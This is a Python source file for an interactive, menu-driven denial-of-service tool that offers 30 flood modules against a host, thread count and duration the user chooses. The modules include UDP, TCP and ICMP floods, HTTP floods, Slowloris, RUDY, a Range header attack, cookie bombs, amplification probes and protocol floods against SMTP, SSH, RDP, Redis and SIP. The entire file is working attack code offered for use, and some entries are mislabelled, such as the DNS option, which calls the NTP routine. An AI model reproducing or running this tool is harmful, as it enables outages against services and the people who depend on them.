#!/usr/bin/env python3
# Rilasciato sotto licenza MIT 

import socket
import threading
import random
import string
import ssl
import time
import sys
import os
import argparse
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# ─────────────────────────────────────────
# ASCII LOGO
# ─────────────────────────────────────────

LOGO = r"""
  ██████╗ ███████╗███╗   ██╗████████╗ ██████╗  ██████╗ ██╗     ███████╗
 ██╔════╝ ██╔════╝████╗  ██║╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
 ██║  ███╗█████╗  ██╔██╗ ██║   ██║   ██║   ██║██║   ██║██║     ███████╗
 ██║   ██║██╔══╝  ██║╚██╗██║   ██║   ██║   ██║██║   ██║██║     ╚════██║
 ╚██████╔╝███████╗██║ ╚████║   ██║   ╚██████╔╝╚██████╔╝███████╗███████║
  ╚═════╝ ╚══════╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
"""

BANNER = """
╔══════════════════════════════════════════════════════════════════╗
║  TARGET  : {host:<20}  PORT : {port:<6}  THREADS : {threads:<5} ║
║  TOOL    : {tool:<20}  DURATION : {dur:<4}s                      ║
╚══════════════════════════════════════════════════════════════════╝
"""

COLORS = {
    "red":    "\033[91m",
    "green":  "\033[92m",
    "yellow": "\033[93m",
    "cyan":   "\033[96m",
    "white":  "\033[97m",
    "gray":   "\033[90m",
    "reset":  "\033[0m",
    "bold":   "\033[1m",
}

def c(color, text):
    return f"{COLORS.get(color,'')}{text}{COLORS['reset']}"

# ─────────────────────────────────────────
# GLOBALS
# ─────────────────────────────────────────

stop_event  = threading.Event()
pkt_counter = 0
pkt_lock    = threading.Lock()

def inc():
    global pkt_counter
    with pkt_lock:
        pkt_counter += 1

# ─────────────────────────────────────────
# UTILS
# ─────────────────────────────────────────

def rand_str(n=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def rand_ip():
    return '.'.join(str(random.randint(1, 254)) for _ in range(4))

def rand_ua():
    return random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1",
        "curl/7.88.1",
        "python-httpx/0.24.0",
        "Go-http-client/2.0",
    ])

# ─────────────────────────────────────────
# ATTACK MODULES
# ─────────────────────────────────────────

def udp_flood(host, port, **kw):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = os.urandom(1024)
    while not stop_event.is_set():
        try:
            sock.sendto(payload, (host, port)); inc()
        except: pass

def tcp_flood(host, port, **kw):
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1); s.connect((host, port)); s.close(); inc()
        except: pass

def http_get(host, port, **kw):
    while not stop_event.is_set():
        try:
            s = socket.socket(); s.settimeout(4); s.connect((host, port))
            r = (f"GET /{rand_str()} HTTP/1.1\r\nHost: {host}\r\n"
                 f"User-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n")
            s.send(r.encode()); s.close(); inc()
        except: pass

def http_post(host, port, **kw):
    while not stop_event.is_set():
        try:
            body = rand_str(512)
            s = socket.socket(); s.settimeout(4); s.connect((host, port))
            r = (f"POST /{rand_str()} HTTP/1.1\r\nHost: {host}\r\n"
                 f"User-Agent: {rand_ua()}\r\nContent-Length: {len(body)}\r\n"
                 f"Content-Type: application/x-www-form-urlencoded\r\n\r\n{body}")
            s.send(r.encode()); s.close(); inc()
        except: pass

def slowloris(host, port, **kw):
    socks = []
    for _ in range(150):
        try:
            s = socket.socket(); s.settimeout(4); s.connect((host, port))
            s.send(f"GET /?{rand_str()} HTTP/1.1\r\nHost: {host}\r\n"
                   f"User-Agent: {rand_ua()}\r\n".encode())
            socks.append(s)
        except: pass
    while not stop_event.is_set():
        for s in list(socks):
            try:
                s.send(f"X-{rand_str(4)}: {rand_str()}\r\n".encode()); inc()
            except:
                socks.remove(s)
                try:
                    ns = socket.socket(); ns.settimeout(4)
                    ns.connect((host, port))
                    socks.append(ns)
                except: pass
        time.sleep(10)

def https_flood(host, port, **kw):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    while not stop_event.is_set():
        try:
            s = socket.create_connection((host, port), timeout=4)
            ss = ctx.wrap_socket(s, server_hostname=host)
            r = (f"GET /{rand_str()} HTTP/1.1\r\nHost: {host}\r\n"
                 f"User-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n")
            ss.send(r.encode()); ss.close(); inc()
        except: pass

def icmp_flood(host, port, **kw):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        print(c("red", "[!] ICMP needs root")); return
    pkt = b'\x08\x00\xf7\xff\x00\x01\x00\x01' + b'A' * 56
    while not stop_event.is_set():
        try: s.sendto(pkt, (host, 0)); inc()
        except: pass

def conn_exhaust(host, port, **kw):
    pool = []
    while not stop_event.is_set():
        try:
            s = socket.socket(); s.connect((host, port)); pool.append(s); inc()
        except:
            if pool: pool.pop(0).close()

def rudy(host, port, **kw):
    while not stop_event.is_set():
        try:
            s = socket.socket(); s.settimeout(10); s.connect((host, port))
            BIG = 1_000_000
            r = (f"POST / HTTP/1.1\r\nHost: {host}\r\n"
                 f"Content-Length: {BIG}\r\n"
                 f"Content-Type: application/x-www-form-urlencoded\r\n\r\n")
            s.send(r.encode())
            for _ in range(BIG):
                if stop_event.is_set(): break
                s.send(b'X'); time.sleep(0.05); inc()
            s.close()
        except: pass

def ssdp_amp(host, port, **kw):
    msg = ("M-SEARCH * HTTP/1.1\r\n"
           f"HOST: {host}:1900\r\n"
           'MAN: "ssdp:discover"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n').encode()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        try: s.sendto(msg, (host, 1900)); inc()
        except: pass

def http_head(host, port, **kw):
    while not stop_event.is_set():
        try:
            s = socket.socket(); s.settimeout(3); s.connect((host, port))
            r = (f"HEAD /{rand_str()} HTTP/1.1\r\nHost: {host}\r\n"
                 f"User-Agent: {rand_ua()}\r\n\r\n")
            s.send(r.encode()); s.close(); inc()
        except: pass

def rand_header(host, port, **kw):
    while not stop_event.is_set():
        try:
            hdrs = "".join(f"X-{rand_str(6)}: {rand_str(16)}\r\n" for _ in range(60))
            s = socket.socket(); s.settimeout(3); s.connect((host, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n{hdrs}\r\n".encode())
            s.close(); inc()
        except: pass

def cookie_bomb(host, port, **kw):
    while not stop_event.is_set():
        try:
            ck = "; ".join(f"{rand_str(8)}={rand_str(16)}" for _ in range(100))
            s = socket.socket(); s.settimeout(3); s.connect((host, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nCookie: {ck}\r\n\r\n".encode())
            s.close(); inc()
        except: pass

def range_exploit(host, port, **kw):
    rng = ",".join(f"{i}-{i+50}" for i in range(0, 10000, 51))
    while not stop_event.is_set():
        try:
            s = socket.socket(); s.settimeout(3); s.connect((host, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nRange: bytes={rng}\r\n\r\n".encode())
            s.close(); inc()
        except: pass

def websocket_flood(host, port, **kw):
    key = "dGhlIHNhbXBsZSBub25jZQ=="
    while not stop_event.is_set():
        try:
            s = socket.socket(); s.settimeout(3); s.connect((host, port))
            r = (f"GET / HTTP/1.1\r\nHost: {host}\r\nUpgrade: websocket\r\n"
                 f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
                 f"Sec-WebSocket-Version: 13\r\n\r\n")
            s.send(r.encode())
            for _ in range(50): s.send(os.urandom(125)); inc()
            s.close()
        except: pass

def smtp_flood(host, port, **kw):
    while not stop_event.is_set():
        try:
            s = socket.socket(); s.settimeout(3); s.connect((host, port))
            s.send(b"EHLO test\r\n")
            s.send(f"MAIL FROM:<{rand_str()}@x.com>\r\n".encode())
            s.send(f"RCPT TO:<{rand_str()}@x.com>\r\n".encode())
            s.send(b"DATA\r\n")
            s.send(f"{rand_str(256)}\r\n.\r\n".encode())
            s.close(); inc()
        except: pass

def ftp_flood(host, port, **kw):
    while not stop_event.is_set():
        try:
            s = socket.socket(); s.settimeout(3); s.connect((host, port))
            s.send(f"USER {rand_str()}\r\nPASS {rand_str()}\r\n".encode())
            s.close(); inc()
        except: pass

def ssh_flood(host, port, **kw):
    while not stop_event.is_set():
        try:
            s = socket.socket(); s.settimeout(3); s.connect((host, port))
            s.send(b"SSH-2.0-OpenSSH_8.9\r\n"); s.close(); inc()
        except: pass

def mysql_flood(host, port, **kw):
    while not stop_event.is_set():
        try:
            s = socket.socket(); s.settimeout(3); s.connect((host, port))
            s.send(os.urandom(64)); s.close(); inc()
        except: pass

def rdp_flood(host, port, **kw):
    while not stop_event.is_set():
        try:
            s = socket.socket(); s.settimeout(3); s.connect((host, port))
            s.send(os.urandom(19)); s.close(); inc()
        except: pass

def redis_flood(host, port, **kw):
    while not stop_event.is_set():
        try:
            s = socket.socket(); s.settimeout(3); s.connect((host, port))
            s.send(b"*1\r\n$4\r\nINFO\r\n" * 50); s.close(); inc()
        except: pass

def sip_flood(host, port, **kw):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        try:
            inv = (f"INVITE sip:{rand_str()}@{host} SIP/2.0\r\n"
                   f"Via: SIP/2.0/UDP {rand_ip()}:5060\r\n"
                   f"From: <sip:{rand_str()}@{rand_ip()}>\r\n"
                   f"To: <sip:{rand_str()}@{host}>\r\n"
                   f"Call-ID: {rand_str()}\r\nCSeq: 1 INVITE\r\n"
                   f"Content-Length: 0\r\n\r\n")
            s.sendto(inv.encode(), (host, port)); inc()
        except: pass

def zero_window(host, port, **kw):
    while not stop_event.is_set():
        try:
            s = socket.socket(); s.connect((host, port))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)
            s.send(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n"); inc()
            time.sleep(60); s.close()
        except: pass

def fragment_flood(host, port, **kw):
    while not stop_event.is_set():
        try:
            s = socket.socket(); s.settimeout(3); s.connect((host, port))
            for _ in range(100):
                s.send(os.urandom(random.randint(1, 64))); time.sleep(0.001); inc()
            s.close()
        except: pass

def xmlrpc_flood(host, port, **kw):
    body = ('<?xml version="1.0"?><methodCall>'
            '<methodName>pingback.ping</methodName>'
            f'<params><param><value>{rand_str()}</value></param>'
            f'<param><value>{rand_str()}</value></param></params></methodCall>')
    while not stop_event.is_set():
        try:
            s = socket.socket(); s.settimeout(3); s.connect((host, port))
            r = (f"POST /xmlrpc.php HTTP/1.1\r\nHost: {host}\r\n"
                 f"Content-Type: text/xml\r\nContent-Length: {len(body)}\r\n\r\n{body}")
            s.send(r.encode()); s.close(); inc()
        except: pass

def ntp_amp(host, port, **kw):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    pkt = b'\x17\x00\x03\x2a' + b'\x00' * 4
    while not stop_event.is_set():
        try: s.sendto(pkt, (host, 123)); inc()
        except: pass

def memcached_amp(host, port, **kw):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    pkt = b'\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n'
    while not stop_event.is_set():
        try: s.sendto(pkt, (host, 11211)); inc()
        except: pass

def socket_stress(host, port, **kw):
    while not stop_event.is_set():
        try:
            s = socket.socket(); s.connect((host, port))
            s.send(os.urandom(4096)); s.close(); inc()
        except: pass

def thread_bomb(host, port, **kw):
    fns = [udp_flood, tcp_flood, http_get, http_post,
           http_head, socket_stress, rand_header, cookie_bomb]
    with ThreadPoolExecutor(max_workers=300) as ex:
        for i in range(300):
            ex.submit(fns[i % len(fns)], host, port)

# ─────────────────────────────────────────
# TOOL REGISTRY
# ─────────────────────────────────────────

TOOLS = [
    # (id, name,                   fn,              default_port, category)
    ( 1, "UDP Flood",              udp_flood,        80,  "LAYER4"),
    ( 2, "TCP Flood",              tcp_flood,        80,  "LAYER4"),
    ( 3, "ICMP Flood",             icmp_flood,       0,   "LAYER4"),
    ( 4, "HTTP GET Flood",         http_get,         80,  "LAYER7"),
    ( 5, "HTTP POST Flood",        http_post,        80,  "LAYER7"),
    ( 6, "HTTP HEAD Flood",        http_head,        80,  "LAYER7"),
    ( 7, "HTTPS Flood (TLS)",      https_flood,      443, "LAYER7"),
    ( 8, "Slowloris",              slowloris,        80,  "LAYER7"),
    ( 9, "RUDY",                   rudy,             80,  "LAYER7"),
    (10, "WebSocket Flood",        websocket_flood,  80,  "LAYER7"),
    (11, "XMLRPC Pingback",        xmlrpc_flood,     80,  "LAYER7"),
    (12, "Random Header Flood",    rand_header,      80,  "LAYER7"),
    (13, "Cookie Bomb",            cookie_bomb,      80,  "LAYER7"),
    (14, "Range Header Exploit",   range_exploit,    80,  "LAYER7"),
    (15, "Zero-Window Flood",      zero_window,      80,  "LAYER7"),
    (16, "Fragment Flood",         fragment_flood,   80,  "LAYER7"),
    (17, "Connection Exhaust",     conn_exhaust,     80,  "LAYER4"),
    (18, "Socket Stress",          socket_stress,    80,  "LAYER4"),
    (19, "DNS Amplification",      ntp_amp,          53,  "AMP"),
    (20, "NTP Amplification",      ntp_amp,          123, "AMP"),
    (21, "SSDP Amplification",     ssdp_amp,         1900,"AMP"),
    (22, "Memcached Amplification",memcached_amp,    11211,"AMP"),
    (23, "SMTP Flood",             smtp_flood,       25,  "PROTOCOL"),
    (24, "FTP Flood",              ftp_flood,        21,  "PROTOCOL"),
    (25, "SSH Handshake Flood",    ssh_flood,        22,  "PROTOCOL"),
    (26, "MySQL Flood",            mysql_flood,      3306,"PROTOCOL"),
    (27, "RDP Flood",              rdp_flood,        3389,"PROTOCOL"),
    (28, "Redis Flood",            redis_flood,      6379,"PROTOCOL"),
    (29, "SIP Flood",              sip_flood,        5060,"PROTOCOL"),
    (30, "Thread Bomb (multi-vec)",thread_bomb,      80,  "MULTI"),
]

CAT_COLOR = {
    "LAYER4":   "cyan",
    "LAYER7":   "green",
    "AMP":      "yellow",
    "PROTOCOL": "red",
    "MULTI":    "white",
}

# ─────────────────────────────────────────
# MENU
# ─────────────────────────────────────────

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def print_logo():
    print(c("cyan", LOGO))

def print_menu():
    print(c("gray", "─" * 70))
    print(c("bold", f"  {'ID':>3}  {'TOOL NAME':<30} {'CAT':<10} {'DEF PORT'}"))
    print(c("gray", "─" * 70))
    for tid, name, _, dport, cat in TOOLS:
        col   = CAT_COLOR.get(cat, "white")
        catst = c(col, f"[{cat}]")
        print(f"  {c('yellow', str(tid)):>6}  {name:<30} {catst:<20} {c('gray', str(dport))}")
    print(c("gray", "─" * 70))
    print(c("gray", "  0  Exit"))
    print(c("gray", "─" * 70))

def legend():
    print()
    for cat, col in CAT_COLOR.items():
        print(f"  {c(col, f'[{cat}]')}", end="  ")
    print("\n")

def get_input(prompt, default=None, cast=str):
    raw = input(c("cyan", prompt)).strip()
    if not raw and default is not None:
        return default
    try:
        return cast(raw)
    except:
        return default

# ─────────────────────────────────────────
# LIVE STATS
# ─────────────────────────────────────────

def stats_thread(duration, tool_name, host, port):
    start = time.time()
    while not stop_event.is_set():
        elapsed  = time.time() - start
        remain   = max(0, duration - elapsed)
        pps      = int(pkt_counter / max(elapsed, 1))
        bar_fill = int((elapsed / duration) * 30) if duration > 0 else 0
        bar      = c("green", "█" * bar_fill) + c("gray", "░" * (30 - bar_fill))
        line = (
            f"\r  {c('cyan', tool_name):<35} "
            f"pkts: {c('yellow', str(pkt_counter)):<12} "
            f"pps: {c('green', str(pps)):<10} "
            f"[{bar}] {c('gray', f'{remain:.1f}s')}"
        )
        sys.stdout.write(line)
        sys.stdout.flush()
        time.sleep(0.5)
    print()

# ─────────────────────────────────────────
# LAUNCHER
# ─────────────────────────────────────────

def launch(tid, host, port, threads, duration):
    global pkt_counter
    pkt_counter = 0
    stop_event.clear()

    entry = next((t for t in TOOLS if t[0] == tid), None)
    if not entry:
        print(c("red", "[!] Invalid tool ID")); return

    _, name, fn, dport, cat = entry
    port = port if port else dport

    clear()
    print_logo()
    print(BANNER.format(
        host=host, port=port,
        threads=threads, dur=duration,
        tool=name
    ))
    print(c("yellow", f"  [*] Spawning {threads} threads..."))

    ts = []
    for _ in range(threads):
        t = threading.Thread(target=fn, args=(host, port), daemon=True)
        t.start(); ts.append(t)

    st = threading.Thread(
        target=stats_thread,
        args=(duration, name, host, port),
        daemon=True
    )
    st.start()

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print(c("red", "\n  [!] Interrupted by user"))

    stop_event.set()
    print(c("green", f"\n  [+] Done — {pkt_counter} packets sent."))
    time.sleep(1)

# ─────────────────────────────────────────
# MAIN LOOP
# ─────────────────────────────────────────

def main():
    while True:
        clear()
        print_logo()
        print_menu()
        legend()

        choice = get_input("  Select tool [0-30] → ", cast=int, default=0)
        if choice == 0:
            print(c("gray", "\n  6767 — bye.\n")); break
        if choice not in [t[0] for t in TOOLS]:
            print(c("red", "  [!] Bad choice")); time.sleep(1); continue

        print()
        host     = get_input("  Target host/IP  → ")
        port     = get_input("  Port [enter=default] → ", default=0, cast=int)
        threads  = get_input("  Threads [100]   → ", default=100, cast=int)
        duration = get_input("  Duration (sec) [30] → ", default=30, cast=int)

        launch(choice, host, port, threads, duration)

        again = get_input("\n  [*] Run another? [y/N] → ", default="n").lower()
        if again != "y":
            print(c("gray", "\n  6767 — gng.\n")); break

if __name__ == "__main__":
    main()